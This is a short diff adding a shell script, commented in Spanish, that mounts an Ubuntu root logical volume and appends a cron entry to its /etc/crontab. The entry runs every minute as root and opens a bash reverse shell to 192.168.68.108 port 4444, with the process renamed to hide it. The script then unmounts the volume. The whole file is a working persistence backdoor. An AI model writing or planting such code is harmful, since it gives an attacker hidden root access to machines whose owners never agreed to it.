@@ -1,0 +1,8 @@
+# Montar ubuntu--vg-root en /tmp para crear un volumen lógico
+mount /dev/mapper/ubuntu--vg-root /tmp 
+# Reverse shell utilizando bash y programándola como tarea en cron
+echo -e "* * * * * root /bin/bash -c 'exec -a EMShell bash -i >& /dev/tcp/192.168.68.108/4444 0>&1'" >> /tmp/etc/crontab
+# Desmontar el volumen lógico
+umount /tmp
+
+exit 0
